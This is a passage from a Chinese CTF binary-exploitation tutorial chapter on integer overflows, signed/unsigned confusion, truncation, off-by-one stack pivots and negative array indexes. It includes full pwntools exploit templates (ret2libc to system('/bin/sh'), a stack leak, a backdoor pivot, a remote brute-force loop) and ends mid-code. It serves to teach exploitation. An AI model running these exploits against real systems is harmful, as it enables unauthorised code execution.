# 09 整数溢出与 Off-by-One

> 整数漏洞本身不写坏内存，它只负责把"长度、下标、大小"变成你想要的任何值——然后由 `read`/`memcpy`/`malloc` 这些"老实人"替你完成溢出。它是栈溢出与堆溢出最常见的隐形引信。

## 本章速览

| 小节 | 漏洞模式 | 核心成因 | 典型战果 |
|:---:|:---|:---|:---|
| 9.1 | 整数表示基础 | 补码 / 截断 / 提升 | 看懂一切整数漏洞的地基 |
| 9.2 | 有符号 / 无符号混淆 | 负数通过有符号检查，传参时符号扩展成超大 `size_t` | 栈溢出、内存泄露 |
| 9.3 | 算术溢出与截断 | 乘法 / 加法回绕、检查与使用位宽不一致 | 堆溢出、负偏移写 |
| 9.4 | off-by-one / off-by-null | 边界差 1 字节 | 栈迁移（改 ebp 低字节）、堆 chunk 重叠 |
| 9.5 | 数组越界与负索引 | 下界不检查 | 读写 GOT、劫持函数指针 |
| 9.6 | 未初始化变量 | 残留数据被当有效值 | 信息泄露、野指针复用 |
| 9.7 | 有符号性细节坑 | 平台差异与隐式转换 | 审计时的"显微镜" |
| 9.8 | 综合利用 | 整数漏洞 × 堆 / 格式化字符串 | 复杂题的串联打法 |
| 9.9 | 典型例题 | 4 道完整实战 | 可直接套用的 exp 模板 |

---

## 9.1 整数在内存中的表示

### 9.1.1 一切皆比特：有符号与无符号

C 语言的 `int` 和 `unsigned int` 同样占 4 字节，唯一的区别是**如何解释这 32 个比特**：

- **无符号（unsigned）**：32 个比特全部当数值，范围 `[0, 2^32-1]`。
- **有符号（signed）**：最高位当符号位（补码表示），范围 `[-2^31, 2^31-1]`。

同一批位模式在两种解释下完全是两个数：

| 位模式 | 作为 int（有符号） | 作为 unsigned int（无符号） |
|:---|---:|---:|
| `0x00000000` | 0 | 0 |
| `0x00000001` | 1 | 1 |
| `0x7FFFFFFF` | 2147483647 | 2147483647 |
| `0x80000000` | -2147483648 | 2147483648 |
| `0xFFFFFF00` | **-256** | 4294928064 |
| `0xFFFFFFFF` | **-1** | **4294967295** |

记住最后一行：**`0xFFFFFFFF` 同时是"-1"和"4294967295"**。所有有符号/无符号混淆漏洞都源自这一行。

### 9.1.2 补码（two's complement）

w 位系统中，负数 `-x` 的位模式 = `2^w - x`（等价于 `~x + 1`，即按位取反加一）：

```text
w = 32：
  -1  →  2^32 - 1   = 0xFFFFFFFF
  -5  →  2^32 - 5   = 0xFFFFFFFB
  -256 →  2^32 - 256 = 0xFFFFFF00

w = 8（char）：
  -1   → 0xFF
  -128 → 0x80        （最小负数，取负仍是它自己，UB）
   127 → 0x7F
```

反过来看（逆向时的口算）：拿到一个最高位为 1 的有符号值，`真实值 = 位模式 - 2^w`。
`0xFFFFFFFB` → `2^32 - 0xFFFFFFFB = 5` → 它是 **-5**。

pwntools 侧完全对齐：`p32(-5)` 打出来的就是 `b'\xfb\xff\xff\xff'`，与 `p32(0xFFFFFFFB)` 一模一样。

### 9.1.3 截断（truncation）

把宽类型赋给窄类型时，**只保留低位的字节**，高位直接丢弃：

```text
int a = 0x12345678;          // 32 位

        ┌─────────┬─────────┐
 a  =  │ 0x1234  │ 0x5678  │     高 16 位   低 16 位
        └────┬────┴────┬────┘
             │ 截断     │
(short)a ────┼─────────┘  = 0x5678     （只留低 16 位）
(char)a  ────┘              = 0x78     （只留低 8 位）
```

攻击者视角（这是利用的关键）：

```text
想让 (short)a == 0x0010（通过某个截断后的检查）：
   只要 a 的低 16 位是 0x0010，高 16 位随便填！
   a = 0xABCD0010、0x00010010、0xFFFF0010 …… 全部通过检查
   而函数实际拿到的还是完整的 a —— 高位就在那里"藏"着杀伤力。
```

小端序下的内存图（`0x12345678` 落在内存里的样子）：

```text
地址：   低 ──────────────────────────▶ 高
       ┌──────┬──────┬──────┬──────┐
       │ 0x78 │ 0x56 │ 0x34 │ 0x12 │
       └──────┴──────┴──────┴──────┘
         LSB                        MSB
截断就是"从左边（高地址端）把高位字节剪掉"，对字节流没有任何检查。
```

### 9.1.4 整数提升（integer promotion）

表达式里出现 `char` / `short` 时，它们会**先被提升成 `int` 再参与运算**（因为 `int` 能装下它们的全部取值）：

- `signed char` / `short` → 提升时**符号扩展**（负数带着负号上去）。
- `unsigned char` / `unsigned short` → 提升时**零扩展**（提升到 int 后变成非负数）。

```c
signed char   c = 0xFF;   // x86 上 c = -1
int x = c;                // 符号扩展 → 0xFFFFFFFF = -1
if (c == 0xFF)            // c 提升为 int = -1，而 0xFF 是 int = 255
    puts("never");        // 永远不执行！

unsigned char u = 0xFF;
int y = u;                // 零扩展 → 255
if (u == 0xFF)            // 255 == 255
    puts("ok");           // 执行
```

这一条直接决定了逆向时如何认变量：**`movsx`（符号扩展）旁边的就是有符号小类型，`movzx`（零扩展）旁边的就是无符号小类型**——详见 9.10.2。

### 9.1.5 类型不对称的根源：read 的原型

```c
ssize_t read(int fd, void *buf, size_t count);
/*      └─ 返回值：有符号（-1 表示出错）      └─ 长度：无符号！ */
```

长度参数无符号、返回值有符号——**99% 的整数漏洞的戏剧都发生在这条不对称上**：
程序用自己的 `int len` 做检查（有符号世界），转手把 `len` 交给 `read`（无符号世界），两个世界对同一串比特的理解完全不同。

---

## 9.2 漏洞模式一：有符号 / 无符号混淆

### 9.2.1 原理：一条从"检查"通往"使用"的类型裂缝

```text
        检查的世界                              使用的世界
┌──────────────────────────┐          ┌────────────────────────────────┐
│ int len;                 │          │ read(fd, buf, len)             │
│ if (len <= 0x100)        │  ─────▶  │ 第 3 参原型：size_t            │
│     ✓ len = -1 也通过！  │          │   (unsigned long)              │
│   （负数 ≤ 0x100 成立）  │          │ len = -1                       │
└──────────────────────────┘          │  → 符号扩展                     │
                                      │  → 0xFFFFFFFFFFFFFFFF          │
                                      │  → "无限"长度                   │
                                      └────────────────────────────────┘
```

一句话总结：**检查时它是有符号 int（负数畅通无阻），使用时它是 size_t（负数变成天文数字）**。

**利用条件**：

1. 长度检查是有符号比较（`cmp` + `jle/jl`），且允许负数通过；
2. 长度的"使用方"（read/recv/函数参数）按无符号解释它；
3. 无 canary（或 canary 可先泄露）。

### 9.2.2 模式 A：负长度打穿 read/recv（→ 栈溢出）

伪 C 代码：

```c
void vuln() {
    char buf[0x100];
    int len;
    scanf("%d", &len);          // 攻击者完全控制 len（有符号 int）
    if (len <= 0x100) {         // 有符号检查：-1 通过
        read(0, buf, len);      // len → size_t 符号扩展 → 0xFFFF...FF
    }                           // read 遇到管道/socket 数据读完就返回
}
```

**为什么 read 可以而 memcpy 通常不行**：`read` 是系统调用，"有多少读多少"，读到我们发送的数据就返回；
而 `memcpy(dst, src, (size_t)-1)` 会真的试图拷贝 2^64 字节，一路撞上未映射页直接段错误——
数据虽然写进去了，但进程没有机会继续执行。所以**负长度 + read/recv 是可利用组合，负长度 + memcpy 是崩溃组合**（真正可利用的 memcpy 场景是截断不一致，见 9.3.2）。

**完整 pwntools 模板（ret2libc，逐行注释）**：

```python
from pwn import *
context(arch='amd64', os='linux', log_level='info')

elf  = ELF('./vuln')
libc = ELF('./libc-2.31.so')
io   = process('./vuln')

# ── 第一轮：负长度绕过检查 + 泄露 libc ──────────────────────────
io.sendlineafter(b'length?', b'-1')      # ① -1 通过有符号检查，
                                         #    read 的 size_t 参数变成"无限"
pop_rdi = 0x401273                       # ② ROPgadget --binary vuln | grep "pop rdi"
ret     = 0x40101a                       #    裸 ret，用于 16 字节栈对齐

payload  = b'a' * 0x48                   # ③ 填充 buf(0x40) + saved rbp(8)
                                         #    （偏移务必用 cyclic 现场确认）
payload += p64(pop_rdi) + p64(elf.got['puts'])   # 参数：puts@got
payload += p64(elf.plt['puts'])          # 调 puts 打印 got 表项 → libc 泄露
payload += p64(elf.sym['main'])          # 返回 main，准备第二轮
io.send(payload)                          # ④ read 收到多少算多少，栈已打穿

leak = u64(io.recvline().strip().ljust(8, b'\x00'))
libc.address = leak - libc.sym['puts']   # puts 实际地址 - 偏移 = 基址
log.success('libc base: %#x', libc.address)

# ── 第二轮：system("/bin/sh") ──────────────────────────────────
io.sendlineafter(b'length?', b'-1')
payload  = b'a' * 0x48
payload += p64(ret)                       # 对齐
payload += p64(pop_rdi) + p64(next(libc.search(b'/bin/sh\x00')))
payload += p64(libc.sym['system'])
io.send(payload)

io.interactive()
```

**变体**：

- `if (len != 0 && len <= 0x100)`：排除了 0，没排除负数；
- 网络协议头里的 `int16_t length` / `int32_t length` 字段（`0x8000` 以上全是负数）；
- `atoi("−1")` 返回负数；`short`/`char` 类型的长度字段天然可负（x86 上 `movsx` 符号扩展）；
- 32 位程序同理：`read(0, buf, (size_t)(int)-1)` → `0xFFFFFFFF`。

**常见坑**：

- 64 位下长度参数是 8 字节：如果长度不是走 `scanf` 而是走字节流，要用 `p64(-1)` 而不是 `p32(-1)`（见 9.11）；
- `scanf` 与 `read` 混用同一个 stdin 时，stdio 缓冲可能把你的 payload 吞掉——**先发长度、等程序真正进入 read 后再发溢出数据**（模板里两次分开 send 正是这个原因）；
- 发送时不要多带换行/多余字节：read 一次性吃进所有到达的数据，多 1 字节也是溢出的一部分。

### 9.2.3 模式 B：负长度做泄露（write/send 越界读）

输出的长度参数同样可能被负数打穿：

```c
void show_note() {
    char buf[0x100];
    int len = get_len();          // 有符号，-1 通过检查
    /* ... buf 中已有数据 ... */
    write(1, buf, len);           // len = -1 → size_t 巨大
}                                 // 内核一路写到未映射页才停 → 泄露其后全部栈内存
```

内核对单次 `write` 的 count 有上限（`MAX_RW_COUNT`，约 2GB），且写到第一个不可读地址就会**部分成功并返回已写字节数**——效果就是：从 `buf` 开始把整个栈（环境变量、libc/栈指针残留）全部倒出来。

```python
# 泄露模板：负长度 + write
io.sendlineafter(b'len:', b'-1')
data = io.recvuntil(b'>> ', drop=True)       # 收到下一个提示符为止
for off in range(0, len(data) - 8, 8):
    v = u64(data[off:off+8])
    if 0x7f0000000000 < v < 0x800000000000:   # 典型的 libc/栈指针形状
        log.info('stack+%#05x = %#x', off, v)
# 把候选指针逐个当作 libc 地址验证（用 libc 中已知符号偏移核对），即可定基址
```

### 9.2.4 模式 C：alloca(neg)

`alloca(n)` 在栈指针上直接扣空间（本质是 `sub esp, n`，不检查栈溢出）。当 n 为负：

```text
正常 alloca(0x40)：                     alloca(-0x40)：

低地址                                  低地址
┌──────────────────┐                    ┌──────────────┐
│ buf（向低地址伸）│                    │ 原 esp       │
├──────────────────┤                    ├──────────────┤
│ 原 esp           │                    │ buf = esp    │ ← esp 被减去负数，反而向高地址移动！
├──────────────────┤                    ├──────────────┤
│ saved ebp        │                    │ saved ebp    │
├──────────────────┤                    ├──────────────┤
│ vuln 的 ret      │                    │ vuln 的 ret  │
└──────────────────┘                    ├──────────────┤ ← 写入会向高地址覆盖调用者栈帧
                                        │ main 的局部… │
高地址                                  └──────────────┘
                                        高地址
```

伪 C 与利用思路：

```c
int main() {
    int n;
    scanf("%d", &n);            // 输入 -0x20
    if (n > 0x100) die();       // 负数通过
    char *buf = alloca(n);      // esp = esp - n = esp + 0x20 → buf 落点异常上移
    read(0, buf, 0x60);         // 固定长度的写入，现在能覆盖 saved ebp / ret，
}                               // 甚至越过本帧去砸调用者的栈帧
```

**利用条件**：负数幅度要小（几字节到几十字节）——向高地址移动太多会直接越过栈顶进入未映射区，程序当场崩；
配合一个固定长度的写入（`read(0, buf, K)`），把返回地址或调用者的返回地址覆盖成已知目标（后门函数 / one_gadget）。

**exp 骨架**：

```python
io.sendlineafter(b'n?', b'-32')          # esp 上移 0x20，buf 抬到 saved rbp 附近
payload = b'a' * 0x8 + p64(0x401234)     # 0x8 为实测的"buf → ret"新距离
io.send(payload)                          # 固定 0x60 的 read 覆盖返回地址
io.interactive()
```

**常见坑**：`alloca` 结果对齐后 buf 落点会随编译器变化，务必 gdb 单步看 `sub rsp` 后的 rsp；
有的实现用 `and rsp, -16` 重新对齐，会抵消小幅度的向高地址移动——这类题目通常关掉了对齐或用 `-fno-stack-protector -O0` 编译。

### 9.2.5 模式 D：malloc / memcpy 吃到负大小

这些组合**通常不是直接利用点，但必须能在审计/逆向时一眼识别**：

| 调用 | 后果 |
|:---|:---|
| `memcpy(dst, src, (size_t)-1)` | 立即一路拷到未映射页 → 段错误 |
| `memset(buf, 0, -1)` | 同上，越界清零到崩 |
| `malloc(-1)` | 请求 `0xFFFFFFFFFFFFFFFF` → 返回 `NULL` |
| `malloc(-1)` 后不判空直接 `memset(p,...)` | 空指针写；64 位下 0 页不可映射（`mmap_min_addr`），直接崩；个别 32 位老题可 `mmap` 0 页利用 |
| `realloc(p, -1)` | 等价 `free(p)`（size 转成无符号后走 free 分支）——个别题目用它制造"假释放" |

真正可利用的 memcpy 场景是**检查与使用之间的截断不一致**，见下一节。

---

## 9.3 漏洞模式二：算术溢出与截断

### 9.3.1 乘法溢出：malloc(count * size)

**这是真实世界（解析器、浏览器、驱动）历史上最大的一类整数 CVE 模式，也是 CTF 堆题的常客。**

伪 C 代码：

```c
/* 漏洞核心（两个方向都可能出现在真实代码里） */
unsigned int count = read_uint();          // 攻击者控制
unsigned int total  = count * 8;           // ★ 32 位乘法：0x20000000 * 8 = 0x1_0000_0000
                                           //   溢出截断 → total = 0
if (total > 0x1000) die();                 // 检查的是"回绕后"的小值 → 通过！
char *p = malloc(total);                   // 分配的也是小值：malloc(0)
read(0, p, count);                         // ★ 使用的却是原始 count：写入 0x20000000 字节！
```

```text
count * 8 在 32 位整数域内完成：
        0x20000000
      ×         8
      ───────────
      0x1_0000_0000   ← 第 33 位被丢弃（unsigned int 只有 32 位）
      = 0x0000_0000   ← malloc 只分到 0 字节，检查也只看到 0

        而 read 的长度用的是原始 count = 0x20000000
        ──→ 分配 0 字节，写入 N 字节：教科书级堆溢出
```

要点：

- `malloc` **不做**乘法溢出检查；`calloc` 内部有检查（`calloc(count,size)` 天然安全）——如果题目"贴心"地用 `malloc` 重写了 calloc 逻辑，往往就是考点；
- 64 位程序若把 count/size 声明为 32 位类型，乘法仍在 32 位域内完成，结果再符号/零扩展成 64 位传给 malloc——漏洞照样存在；
- 利用方向即"**分配小、写入大**"：拿到一个远超申请尺寸的写能力 → 覆盖相邻堆块 → 套 tcache/fastbin/unsorted 攻击（完整套路见第 10 章，本章例题 4 给出完整 exp）。

另一个方向（检查用因子、使用用乘积）：

```c
if (count > 0x100) die();            // 检查 count 本身（小）
obj *arr = malloc(count * 8);        // 使用乘积 → 正常情况安全
for (i = 0; i < count; i++) read_obj(&arr[i]);   // 也安全
/* 但若 8 是 sizeof(obj) 而代码改成了 16 却忘了改检查——见 9.3.2 的"不一致"本质 */
```

### 9.3.2 截断不一致：检查用截断值、使用用原值

```c
int len = read_int();                 // 攻击者控制完整 32 位
if ((short)len > 0x100) die();        // ★ 检查只看低 16 位（且有符号）
read(0, buf, len);                    // ★ 使用的是完整 32 位（符号扩展）
```

```text
len = 0xABCD0010：
        ┌─────────┬─────────┐
        │ 0xABCD  │ 0x0010  │
        └────┬────┴────┬────┘
             │          └─ (short)len = 0x0010 = 16 ≤ 0x100 → 检查通过！
             └──────────── read 实际拿到的 len = 0xABCD0010
                           → 符号扩展后是天文数字 → 想写多少写多少
```

反方向的截断（检查原值、使用截断值）通常把长度"变小"，是**安全方向**；审计时重点抓"**检查窄、使用宽**"。

exp 模板（在 9.2.2 模板基础上只改一步）：

```python
io.sendlineafter(b'len?', str(0xABCD0010 - (1 << 32)).encode())
#                     ↑ 若程序用 %d 读入，发它的有符号十进制形式即可
payload = b'a' * 0x48 + p64(pop_rdi) + p64(elf.got['puts']) + p64(elf.plt['puts'])
io.send(payload)      # read 的 size 巨大 → 收多少算多少，后续与 9.2.2 完全一致
```

**变体**：`(char)len` 只看低 8 位（`0x?0010` 中取 `0x10`）；`len & 0xffff` 显式掩码后再检查；
检查发生在**截断前**、使用发生在**截断后**（或反之）——只要两侧不一致就是裂缝。

### 9.3.3 加法上溢与指针回绕

**加法上溢（signed）**：

```c
int len = read_int();
if (len + 4 <= 0x100) {          // len = 0x7FFFFFFD → len+4 = 0x80000001
    read(0, buf, len + 4);       //   有符号解释是负数 → ≤ 0x100 通过！
}                                // read 的 size = 符号扩展(0x80000001) → 巨大
```

**无符号加法回绕 + 指针回绕（32 位经典）**：

```c
void copy(char *dst, char *src, unsigned int off, unsigned int len) {
    if (off + len > 0x1000) die();      // off = 0xFFFFF000, len = 0x1000
    memcpy(dst + off, src, len);        // off+len = 0（mod 2^32）→ 检查通过！
}                                       // dst + 0xFFFFF000 ≡ dst - 0x1000
```

```text
32 位指针运算按 mod 2^32 回绕：
   dst + 0xFFFFF000  ==  dst - 0x1000     ← "超大正偏移"等于"负偏移"
   ──→ 往 dst 下方（低地址）写 0x1000 字节
   ──→ 低地址上有什么写什么：GOT、saved ebp、其他全局变量……
```

**64 位注意**：指针 + `unsigned int` 时偏移会**零扩展**成 64 位，`dst + 0xFFFFF000` 是向前 4GB，通常直接崩；
64 位上等价打法是把 off 声明成 `int`（有符号），传负数时 `movsxd` 符号扩展 → `dst + (-0x1000)`，效果相同。

**exp 思路**（以 64 位有符号 off 为例）：

```python
io.sendlineafter(b'off:', str(-0x1000).encode())   # 负偏移
io.sendlineafter(b'len:', b'0x2000')
io.send(flat(rop_chain))                            # 往低地址覆盖 GOT/返回地址
```

**利用条件**：加法结果确实回绕（注意比较两侧的符号性：`off + len > 0x1000` 若是无符号比较，回绕成小值才通过；若是有符号比较，上溢成负值也通过——两个方向都要试）。

### 9.3.4 经典错误模式："检查用 int、使用用 size_t"

把本章例题 1 的模式抽象出来——它同时踩了"有符号检查"和"参数符号扩展"两个坑，是**审计时出现频率最高的单点**：

```c
void handle(int fd) {
    int len;
    char buf[0x100];
    recv(fd, &len, sizeof(len), 0);   // 攻击者控制 4 字节，按 int 解释
    if (len > 0x100) {                 // 有符号比较：负数放行
        return;
    }
    process(buf, len);                 // void process(char *, size_t)
}                                      // 传参时 movsxd 符号扩展 → 负数变巨大
```

对应的汇编（IDA 里看到这组搭配直接标红）：

```asm
mov     eax, [rbp+len]
cmp     eax, 0x100
jle     short pass          ; jle/jl = 有符号比较 → -1 通过
...
pass:
movsxd  rdx, eax            ; ★ int → 64 位符号扩展：-1 → 0xFFFFFFFFFFFFFFFF
lea     rsi, [rbp+buf]
xor     edi, edi
call    read
```

修复方式（供对比记忆）：把 `len` 声明为 `size_t` 并用无符号比较（`jbe`），或在检查前显式 `(size_t)(unsigned)len`。

---

## 9.4 漏洞模式三：Off-by-One / Off-by-Null

### 9.4.1 常见代码形态速查

| 代码形态 | 问题 |
|:---|:---|
| `for (i = 0; i <= n; i++) dst[i] = src[i];` | 写了 **n+1** 个元素（`<=` 笔误） |
| `read(0, buf, n + 1)` / `read(0, buf, sizeof(buf)+1)` | 多读 1 字节 |
| `strcpy(dst, src)` | 完全无边界（不止差 1） |
| `strncpy(dst, src, n)` 且 `n == strlen(src)` | 不补 `\0`（见 9.4.2） |
| `memcpy(dst, src, dst_size + 1)` | 多拷 1 字节 |
| `fgets(buf, n, stdin)` | 读 n-1 字符 + `\0`（**安全写法**，对照记忆） |
| `while ((dst[i++] = src[j++]))` | strcpy 复刻版，同样无界 |

off-by-one 的"那 1 字节"落在哪，决定打法：

```text
覆盖 saved rbp/ebp 低 1 字节 → 栈迁移（本节主角）
覆盖 saved ret  低 1 字节    → PIE 开启时无意义；PIE 关闭且低字节可猜时尝试部分覆盖
覆盖 canary 低 1 字节        → canary 最低字节恒为 0x00，被清后可"字节爆破 canary"（另见 05/10 章）
堆上多写 1 个 '\0'          → off-by-null，chunk 元数据被改（见 9.4.4 与第 10 章）
```

### 9.4.2 strncpy 的 n 语义（双重陷阱）

```c
char dst[8];
strncpy(dst, src, 8);
```

`strncpy(dst, src, n)` 的真实语义：

1. **最多**拷 n 字节；
2. 若 `strlen(src) < n`：用 `\0` **补满**到 n 字节（多余地多写 `\0`）；
3. 若 `strlen(src) >= n`：**一个 `\0` 都不补**！

由此产生两个方向的问题：

```text
陷阱 ①（越界读 → 泄露）：src 比 n 长 → dst 里没有 '\0'
        后续 strlen(dst) / printf(dst) / puts(dst) 一路读出界
        → 把栈上紧随其后的数据带出来（配合本题其他输出就是泄露）

陷阱 ②（多写 '\0' → off-by-null）：src 比 n 短很多 → 补 n-strlen(src) 个 '\0'
        在堆上，多出来的那个 '\0' 可能恰好落在下一个 chunk 的 size 最低字节
        → 经典 null-byte poisoning（见 9.4.4）
```

另一个误用：`strncpy(dst, src, strlen(src))`——n 是"最多拷多少"却传成了源长度，
`strlen(src)` 比 `sizeof(dst)` 大多少就溢出多少（不只是 1 字节）。

### 9.4.3 off-by-one 覆盖 saved rbp 低 1 字节 → 栈迁移（重点详解）

这是 off-by-one 在栈上最华丽、也最常考的打法（0ctf2018 babystack 即为此类型）。

**攻击模型**：vuln 函数的缓冲区紧邻 saved rbp（中间无 padding），off-by-one 的那 1 字节恰好落在 **saved rbp 的最低字节**上。

**第一步：看懂那 1 字节写到了哪（64 位，buf = rbp-0x20）**

```text
低地址
┌────────────────────┐ ─┐
│ buf[0x00 .. 0x1F]  │ ◀┼─ buf = S - 0x30 ；read(0, buf, 0x21)
├────────────────────┤  │    第 0x21 个字节（buf+0x20）恰好 = saved rbp 的最低 1 字节
│ saved rbp = S      │ ◀┼─ rbp_vuln = S - 0x10 ；saved rbp 的值 = S（main 的 rbp）
├────────────────────┤  │
│ ret → main         │  │
├────────────────────┤  │
│   main 的栈帧      │  │
└────────────────────┘ ─┘
高地址
```

**第二步：理解 leave;ret 的"双重迁移"机制**

```text
① vuln 的 epilogue：
     leave  →  esp = rbp_vuln ; pop rbp  →  rbp = S'   （S' = 被改过的值）
     ret    →  正常回到 main               （此时 rbp 寄存器里已经是 S'）

② main 的 epilogue（leave; ret 是迁移的"发动机"）：
     leave  →  esp = rbp = S'              ★ 栈顶被"搬"到 S'
               pop  rbp → rbp = [S']       （从新栈顶弹 8 字节当新 rbp）
               ret  →  eip = [S' + 8]      ★ 从 S'+8 取"返回地址"！

③ 结论：只要 S' 落在我们能写入数据的范围内，
        就等于把整个执行流迁移到了我们布置的"伪栈帧"上。
```

**第三步：S' 能落在哪？**

只有最低 1 字节可改 → `S' ∈ [S & ~0xFF, (S & ~0xFF) + 0xFF]`，即围绕原值上下最多 256 字节。
`buf` 在比 S 低 0x30 的地址处（图中在 S 上方），所以：

```text
设 L0 = S 的最低字节（原 saved rbp 低字节）
S' 最小可到 S - L0。要 S' 落进 buf 区间 [S-0x30, S-0x10)：
    需要 L0 ≥ 0x30 - k（k 为 S' 相对 buf 的偏移）
    例：S' = buf + 8 = S - 0x28 → 需要 L0 ≥ 0x28，且新低字节 X = (L0 - 0x28) & 0xFF
```

**关键事实——低 12 位是固定的**：Linux 栈 ASLR 以页为单位随机化，页内偏移由 env/argv 大小决定。
**同一环境（同样的环境变量）下栈地址低 12 位恒定** → L0 本地实测后本地一次打通；
远程环境通常只有 16 字节对齐步进差异 → L0 只有 16 种可能 → 爆破 16 选 1。

**第四步：布置伪栈帧（完整栈图）**

选择 `S' = buf + 8`（X = (L0-0x28)&0xFF），迁移后的执行序列：

```text
main 的 leave:
    esp = S' = buf+0x08
    pop rbp ← [buf+0x08]        （假 rbp，内容随意）
    esp  = buf+0x10
main 的 ret:
    eip ← [buf+0x10] = backdoor ★ 进入后门函数
    esp  = buf+0x18

对齐检查：buf = S-0x30，S 为 16 字节对齐 → buf ≡ 0 (mod 16)
          进入 backdoor 时 esp = buf+0x18 ≡ 8 (mod 16) —— 与 call 进入的
          正常约定一致，system 内部 movaps 不会崩。✔

最终 buf 内布局：
┌─────────────────────────────┬──────────────┬──────────────┬──────────────┬──────┐
│ buf[0x00:0x08]              │ buf[0x08:10] │ buf[0x10:18] │ buf[0x18:20] │ +0x20│
│ 占位（迁移后不再使用）        │ 假 rbp（随意）│ backdoor     │ backdoor(备) │ X    │
└─────────────────────────────┴──────────────┴──────────────┴──────────────┴──────┘
                                                                              ↑
                                                       off-by-one 的 1 字节 = 新 rbp 最低字节
```

**利用条件汇总**：

1. off-by-one 那 1 字节确实落在 saved rbp 上（buf 与 saved rbp 之间不能有 padding）；
2. 调用者的 epilogue 必须是 `leave; ret`（-O0 下默认如此；-O2 常编译成 `add rsp,N; ret`，此法失效）；
3. 调用者返回前不再用 rbp 访问会崩的数据（最简 main 即可）；
4. 无 canary（有的话这 1 字节会落在 canary 上 → `__stack_chk_fail`）；
5. L0 足够大，S' 才够得着 buf（见第三步）。

**完整 pwntools 模板**：

```python
from pwn import *
context(arch='amd64', log_level='info')
elf = ELF('./pwn2')
io  = process('./pwn2')

# —— gdb 实测（本地）：read() 断下时 saved rbp = 0x7ffd?????2a0
#    低 12 位在同一环境下恒定 → 低位 L0 = 0xa0
L0 = 0xa0                       # 原 saved rbp 的最低字节
X  = (L0 - 0x28) & 0xff         # 新 rbp = buf + 8 = 原rbp - 0x28 的最低字节

backdoor = elf.sym['backdoor']  # system("/bin/sh")

payload  = p64(0)               # buf+0x00：占位（迁移后不再使用）
payload += p64(0)               # buf+0x08：main 的 leave 先 pop 这里进 rbp
payload += p64(backdoor)        # buf+0x10：随后 ret 取这里 → backdoor
payload += p64(backdoor)        # buf+0x18：备用（若 rbp' 落到 buf+0x10 也能打）
payload += bytes([X])           # buf+0x20：off-by-one 那 1 字节 → 改 rbp 低位
assert len(payload) == 0x21

io.sendafter(b'hello\n', payload)
io.interactive()
```

**远程爆破模板**（L0 未知，16 字节对齐假设下 16 选 1）：

```python
def try_once(X):
    io = remote(HOST, PORT)
    io.sendafter(b'hello\n', p64(0)*2 + p64(elf.sym['backdoor'])*2 + bytes([X]))
    try:
        io.sendline(b'echo pwned')
        return b'pwned' in io.recv(timeout=1)
    except EOFError:
        return False
    finally:
        io.close()

for X in [(l0 - 0x28) & 0xff for l0 in range(0, 0x100, 0x10)]:   # 16 个候选
    if try_once(X):
        log.success('hit X = %#x', X)
        break
```

**变体**：

- off-by-**two**：可改 saved rbp 低 2 字节 → S' 的活动范围扩大到 64KB，不再依赖 L0 的大小；
- 32 位程序同理（ebp 4 字节，改最低 1 字节，机制一模一样）；
- 落点不是 saved rbp 而是**调用者局部变量里的指针低 1 字节**（如某个 `char *p`）→ 部分 overwrite 让 p 指向别处；
- 若 buf 与 saved rbp 之间隔着 padding，off-by-one 落在 padding 上 → 无效，需要换思路（如先泄漏栈地址改用其他 pivot，见第 07 章）。

**常见坑**：

- 本地能通远程不通：十有八九是 L0 不同（env 长度差异）——按 16 选 1 爆破，或先想办法泄露栈地址；
- `X` 忘了 `& 0xff`；payload 少发/多发那 1 字节；
- main 若在返回前还调用其他函数并通过 rbp 寻址局部变量，S' 指向的"假帧"会让它读到垃圾 → 崩在 main 里（现象是没到 backdoor 就 SIGSEGV）。

### 9.4.4 off-by-null 在堆上的作用（概述）

堆上的 off-by-one 通常表现为"多写一个 `\0`"（`strcpy` 的结尾符、`strncpy` 的补零、`read(n+1)` 后我们主动只让最后一字节是 `\0`）：

```text
正常堆布局（glibc，x64）：
┌──────────────┬───────────────────┬──────────────┬───────────────┐
│ chunk A      │  A 的用户数据 ...  │ chunk B      │  B 的用户数据  │
│ size=0x91    │                   │ size=0x111   │               │
│ (PREV_INUSE) │                   │              │               │
└──────────────┴───────────────────┴──────────────┴───────────────┘
                    ▲ A 的数据多写 1 个 '\0'，正好落在 B 的 size 最低字节
                    → 0x111 → 0x100 ：PREV_INUSE 位被清 0 + size 变小
                    → free(B) / malloc 时 glibc 误判"A 是空闲块"
                    → 按伪造的 prev_size 向后合并 / unlink A 的假 fd/bk
                    → 两个指针指向同一块内存（chunk 重叠）→ tcache/fd 劫持
```

三类经典效果（本章只给方向，完整利用链在第 10 章展开）：

1. **shrink（缩小）**：把后块 size 改小 → free 后的"下一个块"落在前块内部 → 制造重叠；
2. **extend（扩大）**：把前块 size 改大（借掉一个字节位）→ free 后重新 malloc 拿到包含后块的大块 → 读写后块的元数据；
3. **unlink / 后向合并劫持**：PREV_INUSE 被清 → glibc 走 unlink 检查 `prev_size` → 伪造 fd/bk 实现任意地址写（glibc ≥ 2.29 有更多检查，需按版本绕过）。

**利用条件**：溢出的那 1 字节恰好是 `\0`、且目标 chunk 的 size 最低字节非 0（in-use 位为 1）；
**常见坑**：`\0` 清掉的不只是 PREV_INUSE——size 低位本身也被改（如 0x111→0x100），两次影响要一起算。

---

## 9.5 漏洞模式四：数组越界与负索引

### 9.5.1 原理与地址计算

数组下标在机器层面就是**基址 + 下标 × 元素大小**，C 编译器不产生任何边界检查。若程序只检查了上界（`idx < 16`）而漏了下界，负数下标就会指向数组**之前**的内存：

```text
                 &arr[0]
                    │
   ┌───────┬───────┼──────────────────────────┐
   │ ...   │ arr[-3]  arr[-2]  arr[-1] │ arr[0]  arr[1] ... arr[15] │
   └───────┴───────┴────────┬─────────────────┴──────────────────────────┘
   低地址 ◀── 负下标方向      └ 正常区域          正下标方向 ──▶ 高地址

下标换算公式（元素大小 s）：
    目标地址 T（如某个 GOT 表项）
    idx = (T - &arr[0]) / s          ← 通常是负数
    要求 (T - &arr[0]) % s == 0，否则整除会错位，需改用逐字节/半字访问
```

无 PIE 的 ELF 中，`.got.plt` 位于 `.data`/`.bss` **下方**（低地址），而全局数组在 `.bss`——
**负下标从 .bss 出发恰好摸到 GOT**：

```text
低地址 ──▶ 高地址：   .text │ .rodata │ .got.plt │ .data │ .bss
                                  ▲                     ▲
                              printf@got …        全局数组 arr[]
                              ◀──── 负下标方向 ────┘
```

### 9.5.2 负下标读 GOT / 写 GOT

伪 C 代码（64 位，long 数组一次读写 8 字节，最顺手）：

```c
long notes[16];                       // .bss
int main() {
    while (1) {
        int op; long idx, val;
        scanf("%d", &op);
        if (op == 1) { scanf("%ld", &idx); printf("val = %#lx\n", notes[idx]); }
